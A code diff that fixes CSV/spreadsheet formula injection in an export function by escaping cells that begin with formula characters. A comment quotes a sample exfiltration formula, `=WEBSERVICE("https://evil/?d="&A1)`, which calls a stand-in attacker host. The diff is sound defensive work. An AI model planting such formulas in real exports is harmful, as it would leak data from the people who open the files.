@@ -136,12 +136,25 @@ export function buildExportRows(db: DB): ExportRow[] {
   return rows;
 }
 
+/**
+ * Characters Excel and LibreOffice treat as the start of a formula. A cell
+ * beginning with one of them is executed on open, so `=HYPERLINK(...)` or
+ * `=WEBSERVICE("https://evil/?d="&A1)` typed into any funnel field would run on
+ * the machine of whoever opens the export — and /api/export deliberately serves
+ * a BOM and ';' so that Excel opens it. RFC 4180 quoting does not stop this:
+ * Excel strips the quotes and evaluates what is inside.
+ */
+const FORMULA_LEAD = /^[=+\-@\t\r]/;
+
 /** Escape a single CSV field per RFC 4180 for a ';'-delimited dialect. */
 function escapeCsvField(value: string): string {
-  if (/[;"\n\r]/.test(value)) {
-    return `"${value.replace(/"/g, '""')}"`;
+  // Leading apostrophe forces the cell to be read as text; it is not shown as
+  // part of the value in Excel.
+  const safe = FORMULA_LEAD.test(value) ? `'${value}` : value;
+  if (/[;"\n\r]/.test(safe)) {
+    return `"${safe.replace(/"/g, '""')}"`;
   }
-  return value;
+  return safe;
 }
 
 function rowToLine(values: string[]): string {
